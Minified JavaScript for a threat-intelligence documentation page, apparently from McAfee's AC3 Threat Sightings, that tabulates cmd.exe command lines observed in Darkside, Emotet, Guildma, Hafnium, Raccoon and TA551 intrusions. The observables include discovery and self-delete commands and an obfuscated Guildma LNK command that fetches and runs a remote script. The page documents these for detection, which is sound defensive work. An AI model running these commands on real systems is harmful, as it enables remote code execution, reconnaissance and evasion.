"use strict";(self.webpackChunkac3_threat_sightings=self.webpackChunkac3_threat_sightings||[]).push([[4977],{4137:function(t,e,a){a.d(e,{Zo:function(){return s},kt:function(){return u}});var n=a(7294);function r(t,e,a){return e in t?Object.defineProperty(t,e,{value:a,enumerable:!0,configurable:!0,writable:!0}):t[e]=a,t}function l(t,e){var a=Object.keys(t);if(Object.getOwnPropertySymbols){var n=Object.getOwnPropertySymbols(t);e&&(n=n.filter((function(e){return Object.getOwnPropertyDescriptor(t,e).enumerable}))),a.push.apply(a,n)}return a}function i(t){for(var e=1;e<arguments.length;e++){var a=null!=arguments[e]?arguments[e]:{};e%2?l(Object(a),!0).forEach((function(e){r(t,e,a[e])})):Object.getOwnPropertyDescriptors?Object.defineProperties(t,Object.getOwnPropertyDescriptors(a)):l(Object(a)).forEach((function(e){Object.defineProperty(t,e,Object.getOwnPropertyDescriptor(a,e))}))}return t}function m(t,e){if(null==t)return{};var a,n,r=function(t,e){if(null==t)return{};var a,n,r={},l=Object.keys(t);for(n=0;n<l.length;n++)a=l[n],e.indexOf(a)>=0||(r[a]=t[a]);return r}(t,e);if(Object.getOwnPropertySymbols){var l=Object.getOwnPropertySymbols(t);for(n=0;n<l.length;n++)a=l[n],e.indexOf(a)>=0||Object.prototype.propertyIsEnumerable.call(t,a)&&(r[a]=t[a])}return r}var o=n.createContext({}),d=function(t){var e=n.useContext(o),a=e;return t&&(a="function"==typeof t?t(e):i(i({},e),t)),a},s=function(t){var e=d(t.components);return n.createElement(o.Provider,{value:e},t.children)},p={inlineCode:"code",wrapper:function(t){var e=t.children;return n.createElement(n.Fragment,{},e)}},c=n.forwardRef((function(t,e){var a=t.components,r=t.mdxType,l=t.originalType,o=t.parentName,s=m(t,["components","mdxType","originalType","parentName"]),c=d(a),u=r,k=c["".concat(o,".").concat(u)]||c[u]||p[u]||l;return a?n.createElement(k,i(i({ref:e},s),{},{components:a})):n.createElement(k,i({ref:e},s))}));function u(t,e){var a=arguments,r=e&&e.mdxType;if("string"==typeof t||r){var l=a.length,i=new Array(l);i[0]=c;var m={};for(var o in e)hasOwnProperty.call(e,o)&&(m[o]=e[o]);m.originalType=t,m.mdxType="string"==typeof t?t:r,i[1]=m;for(var d=2;d<l;d++)i[d]=a[d];return n.createElement.apply(null,i)}return n.createElement.apply(null,a)}c.displayName="MDXCreateElement"},7088:function(t,e,a){a.r(e),a.d(e,{frontMatter:function(){return m},contentTitle:function(){return o},metadata:function(){return d},toc:function(){return s},default:function(){return c}});var n=a(7462),r=a(3366),l=(a(7294),a(4137)),i=["components"],m={},o=void 0,d={unversionedId:"Weapons/cmd",id:"Weapons/cmd",isDocsHomePage:!1,title:"cmd",description:"Found 19 references across 6 AC3 Threat Sightings. Enjoy!",source:"@site/docs/04-Weapons/cmd.md",sourceDirName:"04-Weapons",slug:"/Weapons/cmd",permalink:"/ac3-threat-sightings/docs/Weapons/cmd",tags:[],version:"current",frontMatter:{},sidebar:"tutorialSidebar",previous:{title:"chrome",permalink:"/ac3-threat-sightings/docs/Weapons/chrome"},next:{title:"cobaltstrike",permalink:"/ac3-threat-sightings/docs/Weapons/cobaltstrike"}},s=[{value:"From the AC3 Threat Sighting for <em>Darkside Ransomware</em>",id:"from-the-ac3-threat-sighting-for-darkside-ransomware",children:[]},{value:"From the AC3 Threat Sighting for <em>Emotet Dec2021</em>",id:"from-the-ac3-threat-sighting-for-emotet-dec2021",children:[]},{value:"From the AC3 Threat Sighting for <em>Guildma RAT</em>",id:"from-the-ac3-threat-sighting-for-guildma-rat",children:[]},{value:"From the AC3 Threat Sighting for <em>Hafnium</em>",id:"from-the-ac3-threat-sighting-for-hafnium",children:[]},{value:"From the AC3 Threat Sighting for <em>Raccoon InfoStealer</em>",id:"from-the-ac3-threat-sighting-for-raccoon-infostealer",children:[]},{value:"From the AC3 Threat Sighting for <em>TA551</em>",id:"from-the-ac3-threat-sighting-for-ta551",children:[]}],p={toc:s};function c(t){var e=t.components,a=(0,r.Z)(t,i);return(0,l.kt)("wrapper",(0,n.Z)({},p,a,{components:e,mdxType:"MDXLayout"}),(0,l.kt)("p",null,"Found 19 references across 6 AC3 Threat Sightings. Enjoy!"),(0,l.kt)("h2",{id:"from-the-ac3-threat-sighting-for-darkside-ransomware"},"From the AC3 Threat Sighting for ",(0,l.kt)("em",{parentName:"h2"},"Darkside Ransomware")),(0,l.kt)("p",null,"Full details at: ",(0,l.kt)("a",{parentName:"p",href:"https://github.com/mcafee-enterprise/ac3-threat-sightings/blob/main/sightings/Sightings_Darkside_Ransomware.yml"},"https://github.com/mcafee-enterprise/ac3-threat-sightings/blob/main/sightings/Sightings_Darkside_Ransomware.yml")),(0,l.kt)("table",null,(0,l.kt)("thead",{parentName:"table"},(0,l.kt)("tr",{parentName:"thead"},(0,l.kt)("th",{parentName:"tr",align:null},"Tactic"),(0,l.kt)("th",{parentName:"tr",align:null},"Procedure"),(0,l.kt)("th",{parentName:"tr",align:null},"Behaviors"),(0,l.kt)("th",{parentName:"tr",align:null},"Observables"))),(0,l.kt)("tbody",{parentName:"table"},(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Exfiltration"),(0,l.kt)("td",{parentName:"tr",align:null},"DarkSide used ",(0,l.kt)("em",{parentName:"td"},"RDP")," to execute a renamed copy of ",(0,l.kt)("em",{parentName:"td"},"rclone.exe")," for Exfiltration."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"CMD")," created a renamed copy of rclone.exe"),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"File Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\User\\\\Public\\\\nfscsvc.exe"))))),(0,l.kt)("h2",{id:"from-the-ac3-threat-sighting-for-emotet-dec2021"},"From the AC3 Threat Sighting for ",(0,l.kt)("em",{parentName:"h2"},"Emotet Dec2021")),(0,l.kt)("p",null,"Full details at: ",(0,l.kt)("a",{parentName:"p",href:"https://github.com/mcafee-enterprise/ac3-threat-sightings/blob/main/sightings/Sightings_Emotet_Dec2021.yml"},"https://github.com/mcafee-enterprise/ac3-threat-sightings/blob/main/sightings/Sightings_Emotet_Dec2021.yml")),(0,l.kt)("table",null,(0,l.kt)("thead",{parentName:"table"},(0,l.kt)("tr",{parentName:"thead"},(0,l.kt)("th",{parentName:"tr",align:null},"Tactic"),(0,l.kt)("th",{parentName:"tr",align:null},"Procedure"),(0,l.kt)("th",{parentName:"tr",align:null},"Behaviors"),(0,l.kt)("th",{parentName:"tr",align:null},"Observables"))),(0,l.kt)("tbody",{parentName:"table"},(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Discovery"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat actor used ",(0,l.kt)("em",{parentName:"td"},"Cobalt Strike")," to launch system native tools for Discovery."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"RunDll32")," spawned CMD for Discovery."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\WINDOWS\\\\system32\\\\cmd.exe /C ping"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\WINDOWS\\\\system32\\\\cmd.exe /C wmic /NAMESPACE:\\\\\\\\root\\\\directory\\\\ldap PATH ds_user GET ds_mail"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\WINDOWS\\\\system32\\\\cmd.exe /C systeminfo"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\WINDOWS\\\\system32\\\\cmd.exe /C net user"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\WINDOWS\\\\system32\\\\cmd.exe /C WMIC /Node:localhost /Namespace:\\\\root\\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\WINDOWS\\\\system32\\\\cmd.exe /C net localgroup administrators"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\WINDOWS\\\\system32\\\\cmd.exe /C whoami"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\WINDOWS\\\\system32\\\\cmd.exe /C wmic /NAMESPACE:\\\\root\\directory\\ldap PATH ds_group where \"ds_samaccountname='Domain Admins'\" Get ds_member /Value"))),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Discovery"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat actor used ",(0,l.kt)("em",{parentName:"td"},"Cobalt Strike")," to perform hands-on-keyboard discovery for Discovery."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"RunDll32")," spawned CMD for multiple discovery commands."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'C:\\\\WINDOWS\\\\system32\\\\cmd.exe /C net group \\"administradores de dominio\\" /#{domain}'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'C:\\\\WINDOWS\\\\system32\\\\cmd.exe /C net group \\"administradores dominio\\" /#{domain}'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\WINDOWS\\\\system32\\\\cmd.exe /C net localgroup administrators"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\WINDOWS\\\\system32\\\\cmd.exe /C net localgroup Administradoras"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\WINDOWS\\\\system32\\\\cmd.exe /C net Administradoras de grupos locales"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\WINDOWS\\\\system32\\\\cmd.exe /C net grupo local administradoras"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\WINDOWS\\\\system32\\\\cmd.exe /C net user #{user} /#{domain}"))))),(0,l.kt)("h2",{id:"from-the-ac3-threat-sighting-for-guildma-rat"},"From the AC3 Threat Sighting for ",(0,l.kt)("em",{parentName:"h2"},"Guildma RAT")),(0,l.kt)("p",null,"Full details at: ",(0,l.kt)("a",{parentName:"p",href:"https://github.com/mcafee-enterprise/ac3-threat-sightings/blob/main/sightings/Sightings_Guildma_RAT.yml"},"https://github.com/mcafee-enterprise/ac3-threat-sightings/blob/main/sightings/Sightings_Guildma_RAT.yml")),(0,l.kt)("table",null,(0,l.kt)("thead",{parentName:"table"},(0,l.kt)("tr",{parentName:"thead"},(0,l.kt)("th",{parentName:"tr",align:null},"Tactic"),(0,l.kt)("th",{parentName:"tr",align:null},"Procedure"),(0,l.kt)("th",{parentName:"tr",align:null},"Behaviors"),(0,l.kt)("th",{parentName:"tr",align:null},"Observables"))),(0,l.kt)("tbody",{parentName:"table"},(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Execution"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat Actor used malicious ",(0,l.kt)("em",{parentName:"td"},".LNK")," file to lure users for Execution."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},".LNK")," file triggered ",(0,l.kt)("em",{parentName:"td"},"CMD.exe")," with obfuscated command-line"),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"\\\"C:\\\\Windows\\\\System32\\\\cmd.exe\\\" /V/D/c \\\"seT sKk=script&&seT px=powershell&&SEt NEGG=C:\\\\Users\\\\Public\\\\Videos\\\\^YqW&&SEt SMO=.H&&SEt XQGZ=^<!sKk!^>try{v6POar c=\\'!sKk!:\\';d=\\'h6POTtP:\\';G6POetObj6POect(c+d+\\'&&sET FIC=ZXEFMZXEFMwaa8.nolii.dateZXEFM?1ZXEFM\\');}catch(e){}close();^</!sKk!^>&&sEt/^p YE8N=\\\"%XQGZ:6PO=%%FIC:ZXEFM=/%\\\"<nul > %NEGG%%SMO%ta\\|!px! -Command \\\"& \\'!NEGG!!SMO!ta\\' \\\""))),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Defense Evasion"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat Actor used ",(0,l.kt)("em",{parentName:"td"},"CMD")," to run obfuscated command that drops ",(0,l.kt)("em",{parentName:"td"},"HTA")," file for Defense Evasion."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"CMD.exe")," spawned with an obfuscated command-line"),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'C:\\Windows\\system32\\cmd.exe  /S /D /c\\" sEt/p YE8N=\\"%XQGZ:6PO=%%FIC:ZXEFM=/%\\" 0<nul 1>%NEGG%%SMO%ta\\"'))),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Defense Evasion"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat Actor used ",(0,l.kt)("em",{parentName:"td"},"CMD")," to run obfuscated command that drops ",(0,l.kt)("em",{parentName:"td"},"HTA")," file for Defense Evasion."),(0,l.kt)("td",{parentName:"tr",align:null},".hta file is created under C:","\\","Users","\\","Public","\\","Videos folder"),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"File Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\Users\\\\Public\\\\Videos\\\\YqW.Hta"))),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Command And Control"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat Actor used ",(0,l.kt)("em",{parentName:"td"},"MSHTA")," to orchestrate the download of Guildma DLL and other artifacts via ",(0,l.kt)("em",{parentName:"td"},"BITSadmin")," for Command And Control."),(0,l.kt)("td",{parentName:"tr",align:null},"CMD.exe is launched by mshta.exe to write content into a file"),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'"C:\\\\Windows\\\\System32\\\\cmd.exe" /V /C "echo C:\\\\Users\\\\Public\\\\Videos\\\\VEO46570203888O\\>C:\\\\Users\\\\Public\\\\lu"&& exit'))),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Command And Control"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat Actor used ",(0,l.kt)("em",{parentName:"td"},"MSHTA")," to orchestrate the download of Guildma DLL and other artifacts via ",(0,l.kt)("em",{parentName:"td"},"BITSadmin")," for Command And Control."),(0,l.kt)("td",{parentName:"tr",align:null},"CMD.exe creates a file called lu (likely an internal flag used by the malware)"),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"File Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\Users\\\\Public\\\\lu"))),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Defense Evasion"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat Actor used ",(0,l.kt)("em",{parentName:"td"},"MSHTA")," to launch a ",(0,l.kt)("em",{parentName:"td"},"PowerShell")," command that loads Guildma DLL for Defense Evasion."),(0,l.kt)("td",{parentName:"tr",align:null},"Another CMD.exe is spawned by mshta.exe to execute PowerShell.exe"),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'"C:\\\\Windows\\\\System32\\\\cmd.exe" /c cd C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\&& ^start ^/W ^/MIN powershell -windowstyle hidden -Command "& "C:\\\\Users\\\\Public\\\\Videos\\\\VEO46570203888O\\\\ctfmon.exe" C:\\\\Users\\\\Public\\\\Videos\\\\VEO46570203888O\\\\ctfmon.log "&& timeout 3600'))),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Execution"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat Actor used ",(0,l.kt)("em",{parentName:"td"},"AutoIt3")," scripts to launch ",(0,l.kt)("em",{parentName:"td"},"Guildma DLL")," for Execution."),(0,l.kt)("td",{parentName:"tr",align:null},"CMD.exe is spawned by mshta.exe to create another file in C:","\\","Users","\\","Public","\\","Videos file"),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'"C:\\Windows\\System32\\cmd.exe" /V /C "echo gharobhnpuluguaoqzgezkk >C:\\Users\\Public\\Videos\\VEO46570203888O\\\\r1.log"&& exit'))),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Execution"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat Actor used ",(0,l.kt)("em",{parentName:"td"},"AutoIt3")," scripts to launch ",(0,l.kt)("em",{parentName:"td"},"Guildma DLL")," for Execution."),(0,l.kt)("td",{parentName:"tr",align:null},"CMD.exe creates a file called r1.log"),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"File Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\Users\\\\Public\\\\Videos\\\\VEO46570203888O\\\\r1.log"))))),(0,l.kt)("h2",{id:"from-the-ac3-threat-sighting-for-hafnium"},"From the AC3 Threat Sighting for ",(0,l.kt)("em",{parentName:"h2"},"Hafnium")),(0,l.kt)("p",null,"Full details at: ",(0,l.kt)("a",{parentName:"p",href:"https://github.com/mcafee-enterprise/ac3-threat-sightings/blob/main/sightings/Sightings_Hafnium.yml"},"https://github.com/mcafee-enterprise/ac3-threat-sightings/blob/main/sightings/Sightings_Hafnium.yml")),(0,l.kt)("table",null,(0,l.kt)("thead",{parentName:"table"},(0,l.kt)("tr",{parentName:"thead"},(0,l.kt)("th",{parentName:"tr",align:null},"Tactic"),(0,l.kt)("th",{parentName:"tr",align:null},"Procedure"),(0,l.kt)("th",{parentName:"tr",align:null},"Behaviors"),(0,l.kt)("th",{parentName:"tr",align:null},"Observables"))),(0,l.kt)("tbody",{parentName:"table"},(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Discovery"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat Actor used ",(0,l.kt)("em",{parentName:"td"},"nltest, net and other basic commands via China Chopper Web Shell")," for Discovery."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"CMD")," spawns discovery commands (",(0,l.kt)("em",{parentName:"td"},"query.exe"),", ",(0,l.kt)("em",{parentName:"td"},"hostname.exe"),", ",(0,l.kt)("em",{parentName:"td"},"ping.exe"),", ",(0,l.kt)("em",{parentName:"td"},"tasklist.exe"),", ",(0,l.kt)("em",{parentName:"td"},"whoami.exe"),")."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"query user"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"hostname"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"ping #{dst} -n 1"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"tasklist\\|findstr dll"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"whoami"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"tasklist"))),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Discovery"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat Actor used ",(0,l.kt)("em",{parentName:"td"},"nltest, net and other basic commands via China Chopper Web Shell")," for Discovery."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"CMD")," spawns ",(0,l.kt)("em",{parentName:"td"},"nltest.exe")," and ",(0,l.kt)("em",{parentName:"td"},"net.exe")," commands."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"nltest /dclist:#{DOMAIN}"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"whoami"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'net group \\"Domain computers\\" /do'))),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Defense Evasion"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat Actor used ",(0,l.kt)("em",{parentName:"td"},"CMD del commands via China Chopper Web Shell")," to delete Web Shell files for Defense Evasion."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"w3wp")," spawns ",(0,l.kt)("em",{parentName:"td"},"CMD")," to run delete commands."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"cmd /c cd /d C:/inetpub/wwwroot/aspnet_client&del 'E:\\Program Files\\Microsoft\\Exchange Server\\V15\\FrontEnd\\HttpProxy\\owa\\auth\\OutlookEN.aspx'&echo [S]"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"cmd /c cd /d C:/inetpub/wwwroot/aspnet_client&del 'E:\\Program Files\\Microsoft\\Exchange Server\\V15\\FrontEnd\\HttpProxy\\owa\\auth\\TimeoutLogout.aspx'&echo [S]"))),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Defense Evasion"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat Actor used ",(0,l.kt)("em",{parentName:"td"},"CMD del commands via China Chopper Web Shell")," to delete Web Shell files for Defense Evasion."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"CMD")," executes ",(0,l.kt)("em",{parentName:"td"},"del")," commands."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"del 'E:\\Program Files\\Microsoft\\Exchange Server\\V15\\FrontEnd\\HttpProxy\\owa\\auth\\OutlookEN.aspx"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"del 'E:\\Program Files\\Microsoft\\Exchange Server\\V15\\FrontEnd\\HttpProxy\\owa\\auth\\TimeoutLogout.aspx"))))),(0,l.kt)("h2",{id:"from-the-ac3-threat-sighting-for-raccoon-infostealer"},"From the AC3 Threat Sighting for ",(0,l.kt)("em",{parentName:"h2"},"Raccoon InfoStealer")),(0,l.kt)("p",null,"Full details at: ",(0,l.kt)("a",{parentName:"p",href:"https://github.com/mcafee-enterprise/ac3-threat-sightings/blob/main/sightings/Sightings_Raccoon_InfoStealer.yml"},"https://github.com/mcafee-enterprise/ac3-threat-sightings/blob/main/sightings/Sightings_Raccoon_InfoStealer.yml")),(0,l.kt)("table",null,(0,l.kt)("thead",{parentName:"table"},(0,l.kt)("tr",{parentName:"thead"},(0,l.kt)("th",{parentName:"tr",align:null},"Tactic"),(0,l.kt)("th",{parentName:"tr",align:null},"Procedure"),(0,l.kt)("th",{parentName:"tr",align:null},"Behaviors"),(0,l.kt)("th",{parentName:"tr",align:null},"Observables"))),(0,l.kt)("tbody",{parentName:"table"},(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Execution"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat actor used ",(0,l.kt)("em",{parentName:"td"},"Visual Basic scripts")," to launch a ",(0,l.kt)("em",{parentName:"td"},"doscmd/batch")," file via ",(0,l.kt)("em",{parentName:"td"},"CMD")," for Execution."),(0,l.kt)("td",{parentName:"tr",align:null},"Malware executed a batch file via CMD."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'C:\\\\Windows\\\\system32\\\\cmd.exe /c \\"\\"C:\\\\ProgramData\\\\IgHMwb34dcD\\\\AVDbbbn7i3b4ho55ck6raahj.bat\\" \\"'))),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Defense Evasion"),(0,l.kt)("td",{parentName:"tr",align:null},"Malware used ",(0,l.kt)("em",{parentName:"td"},"CMD delayed command execution")," to delelete itself for Defense Evasion."),(0,l.kt)("td",{parentName:"tr",align:null},"Raccoon InfoStealer introduced a delayed command execution via CMD to delete itself."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'cmd.exe /C timeout /T 10 /NOBREAK > Nul & Del /f /q "C:\\\\ProgramData\\\\IgHMwb34dcD\\\\door.exe"'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'ping 1.1.1.1 -n 1 -w 3000 > Nul & Del /f /q "C:\\\\ProgramData\\\\IgHMwb34dcD\\\\door.exe"'))))),(0,l.kt)("h2",{id:"from-the-ac3-threat-sighting-for-ta551"},"From the AC3 Threat Sighting for ",(0,l.kt)("em",{parentName:"h2"},"TA551")),(0,l.kt)("p",null,"Full details at: ",(0,l.kt)("a",{parentName:"p",href:"https://github.com/mcafee-enterprise/ac3-threat-sightings/blob/main/sightings/Sightings_TA551.yml"},"https://github.com/mcafee-enterprise/ac3-threat-sightings/blob/main/sightings/Sightings_TA551.yml")),(0,l.kt)("table",null,(0,l.kt)("thead",{parentName:"table"},(0,l.kt)("tr",{parentName:"thead"},(0,l.kt)("th",{parentName:"tr",align:null},"Tactic"),(0,l.kt)("th",{parentName:"tr",align:null},"Procedure"),(0,l.kt)("th",{parentName:"tr",align:null},"Behaviors"),(0,l.kt)("th",{parentName:"tr",align:null},"Observables"))),(0,l.kt)("tbody",{parentName:"table"},(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Execution"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat actor used ",(0,l.kt)("em",{parentName:"td"},"weaponized .doc files")," to lure users for Execution."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Winword")," spawned ",(0,l.kt)("em",{parentName:"td"},"CMD")," to launch ",(0,l.kt)("em",{parentName:"td"},".HTA")," file"),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"cmd /c c:\\\\programdata\\\\brDefine.hta"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"cmd /c c:\\\\programdata\\\\sds.hta"))),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Execution"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat actor used ",(0,l.kt)("em",{parentName:"td"},"weaponized .doc files")," to lure users for Execution."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"CMD")," spawned ",(0,l.kt)("em",{parentName:"td"},"MSHTA"),"."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'"C:\\\\Windows\\\\System32\\\\mshta.exe" "C:\\\\programdata\\\\brDefine.hta"'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'"C:\\\\Windows\\\\SysWOW64\\\\mshta.exe" "C:\\\\programdata\\\\sds.hta" {1E460BD7-F1C3-4B2E-88BF-4E770A288AF5}{1E460BD7-F1C3-4B2E-88BF-4E770A288AF5}'))))))}c.isMDXComponent=!0}}]);